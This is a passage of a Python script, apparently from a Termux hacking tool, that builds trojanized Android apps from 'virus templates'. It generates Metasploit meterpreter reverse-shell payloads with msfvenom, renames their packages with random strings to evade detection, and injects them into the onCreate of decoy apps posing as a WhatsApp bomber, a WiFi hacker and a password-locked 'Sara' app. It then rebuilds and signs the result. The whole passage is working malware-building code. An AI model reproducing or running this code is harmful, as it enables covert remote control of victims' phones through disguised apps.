		<TextView android:textSize="16.0sp" android:textStyle="italic" android:textColor="#ff000000" android:gravity="bottom|center" android:layout_gravity="bottom|center" android:id="@id/textview2" android:padding="8.0dip" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="©Copyright  https://github.com/T-Dynamos" />
	</LinearLayout>
</LinearLayout>
"""
	stringsxml = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
<string name="app_name">{stringapp}</string>
</resources>"""
	os.system("rm -rf android_payload.apk android_payload normal_apk 1 final.apk tmp.sh > /dev/null 2>&1")
	os.system("cp -r lib/whatsappbomber normal_apk")
	makeFile(f"{pwd}/normal_apk/res/layout/main.xml",mainxml)	
	makeFile(f"{pwd}/normal_apk/res/values/strings.xml",stringsxml)	
	if ok == "y":
		os.system(f'cp {icon} {pwd}/normal_apk/res/drawable-xhdpi/app_icon.png')
	else:
		pass
	if ok2 == "y":
		os.system(f'cp {icon2} {pwd}/normal_apk/res/drawable-xhdpi/splash.png')
	else:
		pass 	
	message("Creating Payload")
	remove ("android_payload.apk")
	a = (f"msfvenom -p {type_of_payload} LHOST={lhost} LPORT={lport} R> android_payload.apk")
	from halo import Halo
	spinner1= Halo(text=f'{W}Running {G+a}',spinner= 'dots')
	spinner1.start()

	makeFile("tmp.sh",a)
	os.system("bash tmp.sh > /dev/null 2>&1")
	spinner1.stop()
	a = ("rm -rf android_payload > /dev/null 2&>1")
	message ("Decompiling Payload ")

	execute(f"apktool d -f android_payload.apk -o {pwd}/android_payload")
	
	message ("Generating Random Variables")
	
	VAR1 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR1 = str(VAR1.strip()).split('\'')[1]
	VAR2 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR2 = str(VAR2.strip()).split('\'')[1]
	VAR3 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR3 = str(VAR3.strip()).split('\'')[1]
	VAR4 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR4 = str(VAR4.strip()).split('\'')[1]
	VAR5 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR5 = str(VAR5.strip()).split('\'')[1]
	VAR6 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR6 = str(VAR6.strip()).split('\'')[1]
	VAR7 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR7 = str(VAR7.strip()).split('\'')[1]
	VAR8 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR8 = str(VAR8.strip()).split('\'')[1]
	apkName = "ThisIsATest"
	os.system(f"mv {pwd}/android_payload/smali/com/metasploit {pwd}/android_payload/smali/com/{VAR1}")
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/stage {pwd}/android_payload/smali/com/{VAR1}/{VAR2}")
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/Payload.smali {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#/metasploit/stage#/{VAR1}/{VAR2}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
	os.system(f"sed -i \"s#Payload#{VAR3}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
	os.system(f"sed -i \"s#com.metasploit.meterpreter.AndroidMeterpreter#com.{VAR4}.{VAR5}.{VAR6}#\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#payload#{VAR7}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#com.metasploit.stage#com.{VAR1}.{VAR2}#\" {pwd}/android_payload/AndroidManifest.xml")
	os.system(f"sed -i \"s#metasploit#{VAR8}#\" {pwd}/android_payload/AndroidManifest.xml")
	os.system(f"sed -i \"s#MainActivity#{apkName}#\" {pwd}/android_payload/res/values/strings.xml") 
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1} {pwd}/normal_apk/smali/com/")
	launcherActivity="normal_apk/smali/com/whatsapp/bomber/MainActivity.smali"
	os.system("sed -i \"/method.*onCreate(/ainvoke-static {p0}, Lcom/"+VAR1+"/"+VAR2+"/"+VAR3+";->start(Landroid/content/Context;)V\" "+pwd+"/"+launcherActivity+"")
	message ("Compliling Payload")
	os.chdir(f"normal_apk")
	execute("apktool b -o final.apk")
	message ("Signing Apk")
	os.system("keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -addprovider SunPKCS11")
	os.system('jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA final.apk androiddebugkey > /dev/null 2&>1')	
	os.system(f"mv final.apk {pathout}")
	message (f"Saved Successful as {Y+pathout}")
	os.system("cd .. && rm -rf android_payload.apk android_payload normal_apk final.apk tmp.sh")
def build_wifihacker():
	appnm = ask("Enter the new name for App : ")
	password = ask("Enter password for PassActivity :")
	ok = ask("Do you want to change app icon [y/n]: ")
	if ok == "y":
		icon = ask("Enter the path of png file")
		if os.path.exists(icon):
			pass
		else:
			error ("Icon not found ",1)
			res()
	ok2 = ask("Do you want to change Splash Screen Icon [y/n]")
	if ok2 == "y":
		icon2 = ask("Enter the path of png file")
		if os.path.exists(icon):
			pass
		else:
			error ("Icon not found ",1)
			res()
	else:
		pass
	lhost = ask("Enter the lhost for Metasploit :")
	lport = ask("Enter the lport for Metasploit :")
	pathout = ask("Enter the output path :")
	
	print(W+f"""
{B}╔═══════════════════════════════════════╗
║      {G} Available Types of Payload{B}      ║
║                                       ║
║{Y}[1] android/meterpreter/reverse_tcp{B}    ║
║{Y}[2] android/meterpreter/reverse_http{B}   ║   
║{Y}[3] android/meterpreter/reverse_https{B}  ║
╚═══════════════════════════════════════╝\n""")
	payload_type = ask(f" Which  Type of Payload, You Want to Create (1/2/3):")
	if payload_type == '1':
	   type_of_payload = "android/meterpreter/reverse_tcp"
	elif payload_type == '2':
		type_of_payload = "android/meterpreter/reverse_http"
	elif payload_type == '3':
	   type_of_payload = "android/meterpreter/reverse_https"
	else:
		error("Wrong Option")
		print()
		res()
	stringsxml = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="abc_action_bar_home_description">Navigate home</string>
    <string name="abc_action_bar_up_description">Navigate up</string>
    <string name="abc_action_menu_overflow_description">More options</string>
    <string name="abc_action_mode_done">Done</string>
    <string name="abc_activity_chooser_view_see_all">See all</string>
    <string name="abc_activitychooserview_choose_application">Choose an app</string>
    <string name="abc_capital_off">OFF</string>
    <string name="abc_capital_on">ON</string>
    <string name="abc_menu_alt_shortcut_label">Alt+</string>
    <string name="abc_menu_ctrl_shortcut_label">Ctrl+</string>
    <string name="abc_menu_delete_shortcut_label">delete</string>
    <string name="abc_menu_enter_shortcut_label">enter</string>
    <string name="abc_menu_function_shortcut_label">Function+</string>
    <string name="abc_menu_meta_shortcut_label">Meta+</string>
    <string name="abc_menu_shift_shortcut_label">Shift+</string>
    <string name="abc_menu_space_shortcut_label">space</string>
    <string name="abc_menu_sym_shortcut_label">Sym+</string>
    <string name="abc_prepend_shortcut_label">Menu+</string>
    <string name="abc_search_hint">Search…</string>
    <string name="abc_searchview_description_clear">Clear query</string>
    <string name="abc_searchview_description_query">Search query</string>
    <string name="abc_searchview_description_search">Search</string>
    <string name="abc_searchview_description_submit">Submit query</string>
    <string name="abc_searchview_description_voice">Voice search</string>
    <string name="abc_shareactionprovider_share_with">Share with</string>
    <string name="abc_shareactionprovider_share_with_application">Share with %s</string>
    <string name="abc_toolbar_collapse_description">Collapse</string>
    <string name="app_name">{appnm}</string>
    <string name="appbar_scrolling_view_behavior">com.google.android.material.appbar.AppBarLayout$ScrollingViewBehavior</string>
    <string name="bottom_sheet_behavior">com.google.android.material.bottomsheet.BottomSheetBehavior</string>
    <string name="bottomsheet_action_expand_halfway">Expand halfway</string>
    <string name="character_counter_content_description">Characters entered %1$d of %2$d</string>
    <string name="character_counter_overflowed_content_description">Character limit exceeded %1$d of %2$d</string>
    <string name="character_counter_pattern">%1$d/%2$d</string>
    <string name="chip_text">Chip text</string>
    <string name="clear_text_end_icon_content_description">Clear text</string>
    <string name="error_icon_content_description">Error</string>
    <string name="exposed_dropdown_menu_content_description">Show dropdown menu</string>
    <string name="fab_transformation_scrim_behavior">com.google.android.material.transformation.FabTransformationScrimBehavior</string>
    <string name="fab_transformation_sheet_behavior">com.google.android.material.transformation.FabTransformationSheetBehavior</string>
    <string name="hide_bottom_view_on_scroll_behavior">com.google.android.material.behavior.HideBottomViewOnScrollBehavior</string>
    <string name="icon_content_description">Dialog Icon</string>
    <string name="item_view_role_description">Tab</string>
    <string name="material_clock_display_divider">:</string>
    <string name="material_clock_toggle_content_description">Select AM or PM</string>
    <string name="material_hour_selection">Select hour</string>
    <string name="material_hour_suffix">"%1$s o'clock"</string>
    <string name="material_minute_selection">Select minutes</string>
    <string name="material_minute_suffix">%1$s minutes</string>
    <string name="material_motion_easing_accelerated">cubic-bezier(0.4, 0.0, 1.0, 1.0)</string>
    <string name="material_motion_easing_decelerated">cubic-bezier(0.0, 0.0, 0.2, 1.0)</string>
    <string name="material_motion_easing_emphasized">path(M 0,0 C 0.05, 0, 0.133333, 0.06, 0.166666, 0.4 C 0.208333, 0.82, 0.25, 1, 1, 1)</string>
    <string name="material_motion_easing_linear">cubic-bezier(0.0, 0.0, 1.0, 1.0)</string>
    <string name="material_motion_easing_standard">cubic-bezier(0.4, 0.0, 0.2, 1.0)</string>
    <string name="material_slider_range_end">Range end,</string>
    <string name="material_slider_range_start">Range start,</string>
    <string name="material_timepicker_am">AM</string>
    <string name="material_timepicker_clock_mode_description">Switch to clock mode for the time input.</string>
    <string name="material_timepicker_hour">Hour</string>
    <string name="material_timepicker_minute">Minute</string>
    <string name="material_timepicker_pm">PM</string>
    <string name="material_timepicker_select_time">Select time</string>
    <string name="material_timepicker_text_input_mode_description">Switch to text input mode for the time input.</string>
    <string name="mtrl_badge_numberless_content_description">New notification</string>
    <string name="mtrl_chip_close_icon_content_description">Remove %1$s</string>
    <string name="mtrl_exceed_max_badge_number_content_description">More than %1$d new notifications</string>
    <string name="mtrl_exceed_max_badge_number_suffix">%1$d%2$s</string>
    <string name="mtrl_picker_a11y_next_month">Change to next month</string>
    <string name="mtrl_picker_a11y_prev_month">Change to previous month</string>
    <string name="mtrl_picker_announce_current_selection">Current selection: %1$s</string>
    <string name="mtrl_picker_cancel">@android:string/cancel</string>
    <string name="mtrl_picker_confirm">@android:string/ok</string>
    <string name="mtrl_picker_date_header_selected">%1$s</string>
    <string name="mtrl_picker_date_header_title">Select Date</string>
    <string name="mtrl_picker_date_header_unselected">Selected date</string>
    <string name="mtrl_picker_day_of_week_column_header">Column of days: %1$s</string>
    <string name="mtrl_picker_invalid_format">Invalid format.</string>
    <string name="mtrl_picker_invalid_format_example">Example: %1$s</string>
    <string name="mtrl_picker_invalid_format_use">Use: %1$s</string>
    <string name="mtrl_picker_invalid_range">Invalid range.</string>
    <string name="mtrl_picker_navigate_to_year_description">Navigate to year %1$s</string>
    <string name="mtrl_picker_out_of_range">Out of range: %1$s</string>
    <string name="mtrl_picker_range_header_only_end_selected">Start date – %1$s</string>
    <string name="mtrl_picker_range_header_only_start_selected">%1$s – End date</string>
    <string name="mtrl_picker_range_header_selected">%1$s – %2$s</string>
    <string name="mtrl_picker_range_header_title">Select Range</string>
    <string name="mtrl_picker_range_header_unselected">Start date – End date</string>
    <string name="mtrl_picker_save">Save</string>
    <string name="mtrl_picker_text_input_date_hint">Date</string>
    <string name="mtrl_picker_text_input_date_range_end_hint">End date</string>
    <string name="mtrl_picker_text_input_date_range_start_hint">Start date</string>
    <string name="mtrl_picker_text_input_day_abbr">d</string>
    <string name="mtrl_picker_text_input_month_abbr">m</string>
    <string name="mtrl_picker_text_input_year_abbr">y</string>
    <string name="mtrl_picker_toggle_to_calendar_input_mode">Switch to calendar input mode</string>
    <string name="mtrl_picker_toggle_to_day_selection">Tap to switch to selecting a day</string>
    <string name="mtrl_picker_toggle_to_text_input_mode">Switch to text input mode</string>
    <string name="mtrl_picker_toggle_to_year_selection">Tap to switch to selecting a year</string>
    <string name="password_toggle_content_description">Show password</string>
    <string name="path_password_eye">M12,4.5C7,4.5 2.73,7.61 1,12c1.73,4.39 6,7.5 11,7.5s9.27,-3.11 11,-7.5c-1.73,-4.39 -6,-7.5 -11,-7.5zM12,17c-2.76,0 -5,-2.24 -5,-5s2.24,-5 5,-5 5,2.24 5,5 -2.24,5 -5,5zM12,9c-1.66,0 -3,1.34 -3,3s1.34,3 3,3 3,-1.34 3,-3 -1.34,-3 -3,-3z</string>
    <string name="path_password_eye_mask_strike_through">M2,4.27 L19.73,22 L22.27,19.46 L4.54,1.73 L4.54,1 L23,1 L23,23 L1,23 L1,4.27 Z</string>
    <string name="path_password_eye_mask_visible">M2,4.27 L2,4.27 L4.54,1.73 L4.54,1.73 L4.54,1 L23,1 L23,23 L1,23 L1,4.27 Z</string>
    <string name="path_password_strike_through">M3.27,4.27 L19.74,20.74</string>
    <string name="search_menu_title">Search</string>
    <string name="status_bar_notification_info_overflow">999+</string>
</resources>"""
	passact = '''.class Lcom/wifihacker/PassActivity$1;
.super Ljava/lang/Object;
.source "PassActivity.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/wifihacker/PassActivity;->initialize(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/wifihacker/PassActivity;


# direct methods
.method constructor <init>(Lcom/wifihacker/PassActivity;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/wifihacker/PassActivity$1;->this$0:Lcom/wifihacker/PassActivity;

    .line 83
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 3

    .prologue
    .line 86
    iget-object v0, p0, Lcom/wifihacker/PassActivity$1;->this$0:Lcom/wifihacker/PassActivity;

    invoke-static {v0}, Lcom/wifihacker/PassActivity;->access$0(Lcom/wifihacker/PassActivity;)Landroid/widget/EditText;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-interface {v0}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "'''+password+'''"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 87
    iget-object v0, p0, Lcom/wifihacker/PassActivity$1;->this$0:Lcom/wifihacker/PassActivity;

    invoke-static {v0}, Lcom/wifihacker/PassActivity;->access$1(Lcom/wifihacker/PassActivity;)Landroid/content/Intent;

    move-result-object v0

    iget-object v1, p0, Lcom/wifihacker/PassActivity$1;->this$0:Lcom/wifihacker/PassActivity;

    invoke-virtual {v1}, Lcom/wifihacker/PassActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/wifihacker/Main2Activity;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 88
    iget-object v0, p0, Lcom/wifihacker/PassActivity$1;->this$0:Lcom/wifihacker/PassActivity;

    iget-object v1, p0, Lcom/wifihacker/PassActivity$1;->this$0:Lcom/wifihacker/PassActivity;

    invoke-static {v1}, Lcom/wifihacker/PassActivity;->access$1(Lcom/wifihacker/PassActivity;)Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/wifihacker/PassActivity;->startActivity(Landroid/content/Intent;)V

    .line 93
    :goto_0
    return-void

    .line 91
    :cond_0
    iget-object v0, p0, Lcom/wifihacker/PassActivity$1;->this$0:Lcom/wifihacker/PassActivity;

    invoke-static {v0}, Lcom/wifihacker/PassActivity;->access$2(Lcom/wifihacker/PassActivity;)Landroid/widget/TextView;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setVisibility(I)V

    goto :goto_0
.end method'''
	os.system("rm -rf android_payload.apk android_payload normal_apk 1 final.apk tmp.sh > /dev/null 2>&1")
	os.system("cp -r lib/wifihacker normal_apk")
	makeFile(f"{pwd}/normal_apk/smali_classes3/com/wifihacker//PassActivity$1.smali", passact)	
	makeFile(f"{pwd}/normal_apk/res/values/strings.xml",stringsxml)	
	if ok == "y":
		os.system(f'cp {icon} {pwd}/normal_apk/res/drawable-xhdpi/app_icon.png')
	else:
		pass
	if ok2 == "y":
		os.system(f'cp {icon2} {pwd}/normal_apk/res/drawable-xhdpi/ddjdj.png')
	else:
		pass 	
	message("Creating Payload")
	remove ("android_payload.apk")
	a = (f"msfvenom -p {type_of_payload} LHOST={lhost} LPORT={lport} R> android_payload.apk")
	from halo import Halo
	spinner1= Halo(text=f'{W}Running {G+a}',spinner= 'dots')
	spinner1.start()

	makeFile("tmp.sh",a)
	os.system("bash tmp.sh > /dev/null 2>&1")
	spinner1.stop()
	a = ("rm -rf android_payload > /dev/null 2&>1")
	message ("Decompiling Payload ")

	execute(f"apktool d -f android_payload.apk -o {pwd}/android_payload")
	
	message ("Generating Random Variables")
	
	VAR1 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR1 = str(VAR1.strip()).split('\'')[1]
	VAR2 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR2 = str(VAR2.strip()).split('\'')[1]
	VAR3 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR3 = str(VAR3.strip()).split('\'')[1]
	VAR4 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR4 = str(VAR4.strip()).split('\'')[1]
	VAR5 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR5 = str(VAR5.strip()).split('\'')[1]
	VAR6 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR6 = str(VAR6.strip()).split('\'')[1]
	VAR7 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR7 = str(VAR7.strip()).split('\'')[1]
	VAR8 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR8 = str(VAR8.strip()).split('\'')[1]
	apkName = "ThisIsATest"
	os.system(f"mv {pwd}/android_payload/smali/com/metasploit {pwd}/android_payload/smali/com/{VAR1}")
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/stage {pwd}/android_payload/smali/com/{VAR1}/{VAR2}")
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/Payload.smali {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#/metasploit/stage#/{VAR1}/{VAR2}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
	os.system(f"sed -i \"s#Payload#{VAR3}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
	os.system(f"sed -i \"s#com.metasploit.meterpreter.AndroidMeterpreter#com.{VAR4}.{VAR5}.{VAR6}#\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#payload#{VAR7}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#com.metasploit.stage#com.{VAR1}.{VAR2}#\" {pwd}/android_payload/AndroidManifest.xml")
	os.system(f"sed -i \"s#metasploit#{VAR8}#\" {pwd}/android_payload/AndroidManifest.xml")
	os.system(f"sed -i \"s#MainActivity#{apkName}#\" {pwd}/android_payload/res/values/strings.xml") 
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1} {pwd}/normal_apk/smali/com/")
	launcherActivity="normal_apk/smali_classes3/com/wifihacker/MainActivity.smali"
	os.system("sed -i \"/method.*onCreate(/ainvoke-static {p0}, Lcom/"+VAR1+"/"+VAR2+"/"+VAR3+";->start(Landroid/content/Context;)V\" "+pwd+"/"+launcherActivity+"")
	message ("Compliling Payload")
	os.chdir(f"normal_apk")
	execute("apktool b -o final.apk")
	message ("Signing Apk")
	os.system("keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -addprovider SunPKCS11")
	os.system('jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA final.apk androiddebugkey > /dev/null 2&>1')	
	os.system(f"mv final.apk {pathout}")
	message (f"Saved Successful as {Y+pathout}")
	os.system("cd .. && rm -rf android_payload.apk android_payload normal_apk final.apk tmp.sh")
def writefile(file,old,new):
    while True:
        if os.path.isfile(file):
            replaces = {old:new}
            for line in fileinput.input(file, inplace=True):
                for search in replaces:
                    replaced = replaces[search]
                    line = line.replace(search,replaced)
                print(line, end="")
            break
        else:
             error("Failed to write file",1
			)
def build_sara():
	app_name = ask("Enter the app name :")
	alert_desc = ask("Enter the alert description : ")
	alert_title =ask("Enter the alter title :")
	key_pass =ask("Enter the Unlock password ")
	test = ask("Do you want to change app icon [y/n] :")
	if test == "y":
		app_icon_tmp = ask("Enter the path of app icon :")
		if os.path.exists(app_icon_tmp):
			app_icon = app_icon_tmp
		else:
			error("Icon file not found ",1)
			exit()
	else:
		pass

	lhost = ask("Enter the lhost for Metasploit :")
	lport = ask("Enter the lport for Metasploit :")
	pathout = ask("Enter the output path :")
	
	print(W+f"""
{B}╔═══════════════════════════════════════╗
║      {G} Available Types of Payload{B}      ║
║                                       ║
║{Y}[1] android/meterpreter/reverse_tcp{B}    ║
║{Y}[2] android/meterpreter/reverse_http{B}   ║   
║{Y}[3] android/meterpreter/reverse_https{B}  ║
╚═══════════════════════════════════════╝\n""")
	payload_type = ask(f" Which  Type of Payload, You Want to Create (1/2/3):")
	if payload_type == '1':
	   type_of_payload = "android/meterpreter/reverse_tcp"
	elif payload_type == '2':
		type_of_payload = "android/meterpreter/reverse_http"
	elif payload_type == '3':
	   type_of_payload = "android/meterpreter/reverse_https"
	else:
		error("Wrong Option")
		print()
		res()
	os.system("rm -rf android_payload.apk android_payload normal_apk 1 final.apk tmp.sh > /dev/null 2>&1")
	os.system("cp -r lib/sara normal_apk")
	stringsxml =f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello">Hello World!</string>
    <string name="app_name">{app_name}</string>
    <string name="text">{alert_title}</string>
    <string name="text1">"
{alert_desc}
"</string>
    <string name="password">{key_pass}</string>
</resources>
"""
	makeFile(f"{pwd}/normal_apk/res/values/strings.xml",stringsxml)	
	if test == "y":
		os.system(f'cp {icon} {pwd}/normal_apk/res/drawable-xhdpi/ic_launcher.png')
	else:
		pass
	
	message("Creating Payload")
	remove ("android_payload.apk")
	a = (f"msfvenom -p {type_of_payload} LHOST={lhost} LPORT={lport} R> android_payload.apk")
	from halo import Halo
	spinner1= Halo(text=f'{W}Running {G+a}',spinner= 'dots')
	spinner1.start()

	makeFile("tmp.sh",a)
	os.system("bash tmp.sh > /dev/null 2>&1")
	spinner1.stop()
	a = ("rm -rf android_payload > /dev/null 2&>1")
	message ("Decompiling Payload ")

	execute(f"apktool d -f android_payload.apk -o {pwd}/android_payload")
	
	message ("Generating Random Variables")
	
	VAR1 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR1 = str(VAR1.strip()).split('\'')[1]
	VAR2 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR2 = str(VAR2.strip()).split('\'')[1]
	VAR3 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR3 = str(VAR3.strip()).split('\'')[1]
	VAR4 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR4 = str(VAR4.strip()).split('\'')[1]
	VAR5 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR5 = str(VAR5.strip()).split('\'')[1]
	VAR6 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR6 = str(VAR6.strip()).split('\'')[1]
	VAR7 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR7 = str(VAR7.strip()).split('\'')[1]
	VAR8 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR8 = str(VAR8.strip()).split('\'')[1]
	apkName = "ThisIsATest"
	os.system(f"mv {pwd}/android_payload/smali/com/metasploit {pwd}/android_payload/smali/com/{VAR1}")
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/stage {pwd}/android_payload/smali/com/{VAR1}/{VAR2}")
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/Payload.smali {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#/metasploit/stage#/{VAR1}/{VAR2}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
	os.system(f"sed -i \"s#Payload#{VAR3}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
	os.system(f"sed -i \"s#com.metasploit.meterpreter.AndroidMeterpreter#com.{VAR4}.{VAR5}.{VAR6}#\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#payload#{VAR7}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#com.metasploit.stage#com.{VAR1}.{VAR2}#\" {pwd}/android_payload/AndroidManifest.xml")
	os.system(f"sed -i \"s#metasploit#{VAR8}#\" {pwd}/android_payload/AndroidManifest.xml")
	os.system(f"sed -i \"s#MainActivity#{apkName}#\" {pwd}/android_payload/res/values/strings.xml") 
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1} {pwd}/normal_apk/smali/com/")
	launcherActivity="normal_apk/smali/com/termuxhackers/id/MainActivity.smali"
	os.system("sed -i \"/method.*onCreate(/ainvoke-static {p0}, Lcom/"+VAR1+"/"+VAR2+"/"+VAR3+";->start(Landroid/content/Context;)V\" "+pwd+"/"+launcherActivity+"")
	message ("Compliling Payload")
	os.chdir(f"normal_apk")
	execute("apktool b -o final.apk")
	message ("Signing Apk")
	os.system("keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -addprovider SunPKCS11")
	os.system('jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA final.apk androiddebugkey > /dev/null 2&>1')	
	os.system(f"mv final.apk {pathout}")
	message (f"Saved Successful as {Y+pathout}")
	os.system("cd .. && rm -rf android_payload.apk android_payload normal_apk final.apk tmp.sh")

def executeMain():
	os.system('clear')
	print(logo)
	message("Checking Dependices")
	check_d(["halo"])
	from halo import Halo
	spinner = Halo(text=f'Checking ',spinner= 'dots')
	spinner.start()        		
	check_d(["requests","os","halo","requests"])
	check("python3")
	check("apktool")
	fix_termux_metasploit()
	check("msfvenom")
	import requests
	spinner.stop()
	message ("Checking for updates")
	spinner.start()  
	a = check_v()
	spinner.stop()
	if a is not None:
	   if "NewConnectionError" in a:
	   	error("Network Error",1)
	   else:
	   	print(a)
	else:
		pass
	message ("Select the virus template")
	printBox("Name                         Description            Power ")
	print(text)
	print()
	a= ask("Your Choice :")
	if a == "1":
		build_distruct_x()
	if a == "4":
		build(dir="whatsappbombe;;r")
	if a == "3":
		build_instagramfollowerspro()
	if a == "2":
		build_wifihacker()
	if a == "5":
		build_sara()
	elif a == "6":
		print("Custom build comming soon")
		exit()
	else:
		return executeMain ()
executeMain()
